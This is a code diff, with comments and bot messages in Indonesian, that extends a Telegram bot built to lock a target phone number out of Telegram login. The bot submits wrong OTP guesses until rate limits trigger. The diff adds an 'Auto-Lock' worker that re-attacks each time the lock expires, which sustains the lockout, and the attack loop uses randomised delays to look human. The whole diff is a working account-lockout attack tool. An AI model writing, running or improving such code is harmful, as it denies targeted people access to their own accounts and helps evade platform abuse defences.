@@ -1,3 +1,6 @@
+# Script di buat oleh Nifz
+# Telegram: @nifzz
+
 import asyncio
 import json
 import logging
@@ -30,7 +33,11 @@ logger = logging.getLogger(__name__)
 # State Global
 CONFIG = {}
 ACTIVE_FLOODS = {}      # Format: {"+628123456": timestamp_until}
-PROCESSING_FLOODS = set() # PERBAIKAN 2: Mencegah double-click (Race Condition)
+PROCESSING_FLOODS = set() # Mencegah double-click (Race Condition)
+
+# State untuk Fitur Auto-Lock
+AUTO_LOCK_TARGETS = {}  # Format: {"+628123456": True/False}
+AUTO_LOCK_TASKS = {}    # Menyimpan task asyncio
 
 FLOOD_ATTACK_MAX_ATTEMPTS = 50
 PHONE_REGEX = re.compile(r"^\+\d{7,15}$")
@@ -64,12 +71,65 @@ def get_flood_remaining(phone: str) -> int:
     if not until: return 0
     remaining = int(until - time.monotonic())
     if remaining <= 0:
-        ACTIVE_FLOODS.pop(phone, None) # PERBAIKAN 3: Auto-cleanup memory
+        ACTIVE_FLOODS.pop(phone, None) # Auto-cleanup memory
         return 0
     return remaining
 
 def is_authorized(user_id: int) -> bool:
     return user_id in CONFIG.get("admin_ids", [])
+
+# ================= AUTO-LOCK WORKER =================
+
+async def auto_lock_worker(phone: str):
+    """Background task: Begitu limit habis, tembak ulang otomatis."""
+    logger.info(f"[AUTO-LOCK] Worker started for {phone}")
+    try:
+        while AUTO_LOCK_TARGETS.get(phone, False):
+            remaining = get_flood_remaining(phone)
+            
+            if remaining > 0:
+                # Masih terkunci, tunggu sampai hampir habis (check tiap max 60 detik)
+                wait_time = min(remaining + 10, 60)
+                await asyncio.sleep(wait_time)
+            else:
+                # Limit habis, saatnya menembak lagi!
+                logger.info(f"[AUTO-LOCK] {phone} expired, re-attacking...")
+                try:
+                    seconds, attempts, success, reason = await trigger_flood_attack(phone)
+                    if success:
+                        logger.info(f"[AUTO-LOCK] {phone} re-locked for {format_duration(seconds)}")
+                    else:
+                        logger.warning(f"[AUTO-LOCK] {phone} failed: {reason}")
+                        await asyncio.sleep(60) # Jeda jika gagal
+                except asyncio.CancelledError:
+                    raise
+                except Exception as e:
+                    logger.error(f"[AUTO-LOCK] Error for {phone}: {e}")
+                    await asyncio.sleep(60)
+    except asyncio.CancelledError:
+        logger.info(f"[AUTO-LOCK] Cancelled for {phone}")
+    finally:
+        AUTO_LOCK_TARGETS.pop(phone, None)
+        AUTO_LOCK_TASKS.pop(phone, None)
+        logger.info(f"[AUTO-LOCK] Stopped for {phone}")
+
+def start_auto_lock(phone: str) -> bool:
+    existing = AUTO_LOCK_TASKS.get(phone)
+    if existing and not existing.done():
+        return False
+    AUTO_LOCK_TARGETS[phone] = True
+    AUTO_LOCK_TASKS[phone] = asyncio.create_task(auto_lock_worker(phone))
+    return True
+
+def stop_auto_lock(phone: str) -> bool:
+    was_active = AUTO_LOCK_TARGETS.get(phone, False)
+    AUTO_LOCK_TARGETS[phone] = False
+    task = AUTO_LOCK_TASKS.pop(phone, None)
+    if task and not task.done():
+        task.cancel()
+    return was_active
+
+# ================= ATTACK LOGIC =================
 
 async def trigger_flood_attack(phone: str) -> tuple:
     """Return (seconds, attempts, success, reason)"""
@@ -125,8 +185,7 @@ async def trigger_flood_attack(phone: str) -> tuple:
                 logger.error(f"Error sign-in: {e}")
                 phone_code_hash = None # Reset hash jika ada error aneh
                 
-            # PERBAIKAN 1: Jitter Delay (Jeda acak antara 1.2 sampai 2.5 detik)
-            # Membuat pola tembakan terlihat seperti manusia, bukan robot.
+            # Jitter Delay (Jeda acak antara 1.2 sampai 2.5 detik)
             await asyncio.sleep(random.uniform(1.2, 2.5))
             
     finally:
@@ -183,69 +242,81 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "menu_status":
         context.user_data['awaiting_phone'] = False
-        lines = ["⏳ **Nomor dalam FloodWait**\n"]
+        
+        # Gabungkan nomor yang terkunci & yang sedang auto-lock
+        all_phones = set(list(ACTIVE_FLOODS.keys()) + list(AUTO_LOCK_TARGETS.keys()))
+        lines = ["⏳ **Status Nomor**\n"]
         any_flood = False
-        for phone in list(ACTIVE_FLOODS.keys()):
+        
+        for phone in list(all_phones):
             remaining = get_flood_remaining(phone)
+            is_auto = AUTO_LOCK_TARGETS.get(phone, False)
+            auto_tag = " 🔁" if is_auto else ""
+            
             if remaining > 0:
                 any_flood = True
-                lines.append(f"• `{phone}` — {format_duration(remaining)}")
+                lines.append(f"• `{phone}`{auto_tag} — {format_duration(remaining)}")
+            elif is_auto:
+                any_flood = True
+                lines.append(f"• `{phone}`{auto_tag} — _menunggu re-attack..._")
         
         if not any_flood:
             lines.append("✅ Tidak ada nomor yang terkunci.")
         
-        keyboard = [[InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]]
+        keyboard = []
+        for phone in list(AUTO_LOCK_TARGETS.keys()):
+            if AUTO_LOCK_TARGETS.get(phone):
+                keyboard.append([InlineKeyboardButton(f"🛑 Stop Auto-Lock {phone}", callback_data=f"stop_auto_{phone}")])
+        keyboard.append([InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")])
+        
         await query.edit_message_text(
             "\n".join(lines),
             parse_mode=ParseMode.MARKDOWN,
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
 
-    elif data.startswith("confirm_flood_"):
-        phone = data.replace("confirm_flood_", "")
+    elif data.startswith("confirm_once_"):
+        phone = data.replace("confirm_once_", "")
+        await execute_lock(query, context, phone, auto=False)
+
+    elif data.startswith("confirm_auto_"):
+        phone = data.replace("confirm_auto_", "")
+        await execute_lock(query, context, phone, auto=True)
+
+    elif data.startswith("stop_auto_"):
+        phone = data.replace("stop_auto_", "")
+        was_active = stop_auto_lock(phone)
+        if was_active:
+            await query.answer(f"Auto-Lock dihentikan untuk {phone}")
+        else:
+            await query.answer("Tidak ada auto-lock aktif")
         
-        # PERBAIKAN 2: Cek apakah nomor ini sedang diproses
-        if phone in PROCESSING_FLOODS:
-            await query.answer("⏳ Proses untuk nomor ini sedang berjalan. Mohon tunggu!", show_alert=True)
-            return
-            
-        PROCESSING_FLOODS.add(phone)
+        # Refresh halaman status secara otomatis setelah distop
+        all_phones = set(list(ACTIVE_FLOODS.keys()) + list(AUTO_LOCK_TARGETS.keys()))
+        lines = ["⏳ **Status Nomor**\n"]
+        any_flood = False
         
-        try:
-            await query.answer("Memulai proses tebak OTP...")
+        for p in list(all_phones):
+            remaining = get_flood_remaining(p)
+            is_auto = AUTO_LOCK_TARGETS.get(p, False)
+            auto_tag = " 🔁" if is_auto else ""
+            if remaining > 0:
+                any_flood = True
+                lines.append(f"• `{p}`{auto_tag} — {format_duration(remaining)}")
+            elif is_auto:
+                any_flood = True
+                lines.append(f"• `{p}`{auto_tag} — _menunggu re-attack..._")
+        
+        if not any_flood:
+            lines.append("✅ Tidak ada nomor yang terkunci.")
             
-            await query.edit_message_text(
-                f"🔥 **Memproses {phone}...**\n\n"
-                f"Bot sedang menebak kode OTP secara acak untuk memicu pemblokiran. Mohon tunggu...",
-                parse_mode=ParseMode.MARKDOWN
-            )
-
-            seconds, attempts, success, reason = await trigger_flood_attack(phone)
-
-            if success:
-                until_utc = (datetime.utcnow() + timedelta(seconds=seconds)).strftime("%H:%M UTC")
-                text = (
-                    f"✅ **Nomor Berhasil Dikunci**\n\n"
-                    f"Nomor: `{phone}`\n"
-                    f"Durasi: **{format_duration(seconds)}** (Sampai {until_utc})\n"
-                    f"Percobaan Salah: {attempts}x\n"
-                    f"Status: _{reason}_\n\n"
-                    f"🛡️ Tidak ada OTP yang bisa digunakan untuk login selama periode tersebut."
-                )
-            else:
-                text = (
-                    f"⚠️ **Proses Tidak Berhasil**\n\n"
-                    f"Nomor: `{phone}`\n"
-                    f"Percobaan: {attempts}x\n"
-                    f"Alasan: **{reason}**"
-                )
-
-            keyboard = [[InlineKeyboardButton("🔙 Menu Utama", callback_data="main_menu")]]
-            await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
-            
-        finally:
-            # Hapus dari antrean setelah selesai atau error
-            PROCESSING_FLOODS.discard(phone)
+        keyboard = []
+        for p in list(AUTO_LOCK_TARGETS.keys()):
+            if AUTO_LOCK_TARGETS.get(p):
+                keyboard.append([InlineKeyboardButton(f"🛑 Stop Auto-Lock {p}", callback_data=f"stop_auto_{p}")])
+        keyboard.append([InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")])
+        
+        await query.edit_message_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
 
     elif data == "cancel_flood":
         context.user_data['awaiting_phone'] = False
@@ -254,6 +325,61 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "❌ Dibatalkan. Kembali ke menu utama.",
             reply_markup=get_main_menu()
         )
+
+async def execute_lock(query, context, phone: str, auto: bool):
+    if phone in PROCESSING_FLOODS:
+        await query.answer("⏳ Proses untuk nomor ini sedang berjalan!", show_alert=True)
+        return
+    
+    PROCESSING_FLOODS.add(phone)
+    
+    try:
+        await query.answer("Memulai proses tebak OTP...")
+        
+        mode_text = "🔁 **Mode Auto-Lock Aktif**\n\n" if auto else ""
+        await query.edit_message_text(
+            f"🔥 **Memproses {phone}...**\n\n"
+            f"{mode_text}"
+            f"Bot sedang menebak kode OTP secara acak. Mohon tunggu...",
+            parse_mode=ParseMode.MARKDOWN
+        )
+
+        seconds, attempts, success, reason = await trigger_flood_attack(phone)
+
+        if success:
+            until_utc = (datetime.utcnow() + timedelta(seconds=seconds)).strftime("%H:%M UTC")
+            
+            if auto:
+                start_auto_lock(phone)
+                footer = (
+                    f"🔁 **Auto-Lock Aktif**\n"
+                    f"Bot akan menembak ulang otomatis jika masa limit habis.\n"
+                    f"Stop via menu **Cek Status Aktif**."
+                )
+            else:
+                footer = "🛡️ Tidak ada OTP yang bisa digunakan untuk login selama periode tersebut."
+            
+            text = (
+                f"✅ **Nomor Berhasil Dikunci**\n\n"
+                f"Nomor: `{phone}`\n"
+                f"Durasi: **{format_duration(seconds)}** (Sampai {until_utc})\n"
+                f"Percobaan Salah: {attempts}x\n"
+                f"Status: _{reason}_\n\n"
+                f"{footer}"
+            )
+        else:
+            text = (
+                f"⚠️ **Proses Tidak Berhasil**\n\n"
+                f"Nomor: `{phone}`\n"
+                f"Percobaan: {attempts}x\n"
+                f"Alasan: **{reason}**"
+            )
+
+        keyboard = [[InlineKeyboardButton("🔙 Menu Utama", callback_data="main_menu")]]
+        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
+        
+    finally:
+        PROCESSING_FLOODS.discard(phone)
 
 # ================= MESSAGE HANDLER (INPUT NOMOR) =================
 
@@ -288,15 +414,18 @@ async def handle_phone_input(update: Update, context: ContextTypes.DEFAULT_TYPE)
     context.user_data['awaiting_phone'] = False
     
     keyboard = [
-        [InlineKeyboardButton("✅ Ya, Lock Nomor", callback_data=f"confirm_flood_{phone}")],
+        [InlineKeyboardButton("✅ Lock Sekali", callback_data=f"confirm_once_{phone}")],
+        [InlineKeyboardButton("🔁 Auto-Lock (Berulang)", callback_data=f"confirm_auto_{phone}")],
         [InlineKeyboardButton("❌ Batal", callback_data="cancel_flood")]
     ]
     
     await update.message.reply_text(
         f"🔥 **Konfirmasi FloodWait**\n\n"
         f"Target: `{phone}`\n\n"
-        f"Bot akan menebak kode OTP yang salah secara berulang sampai Telegram memblokir nomor ini.\n"
-        f"Efek: Siapa pun (termasuk Anda) tidak akan bisa login menggunakan nomor ini untuk sementara waktu.\n\n"
+        f"Bot akan menebak kode OTP yang salah secara berulang sampai Telegram memblokir nomor ini.\n\n"
+        f"**Pilih Mode:**\n"
+        f"• **Lock Sekali**: Berhenti setelah limit pertama berhasil didapatkan.\n"
+        f"• **Auto-Lock**: Akan menembak ulang secara otomatis saat masa limit habis (⚠️ Berisiko tinggi untuk api_id).\n\n"
         f"Lanjutkan?",
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=InlineKeyboardMarkup(keyboard)
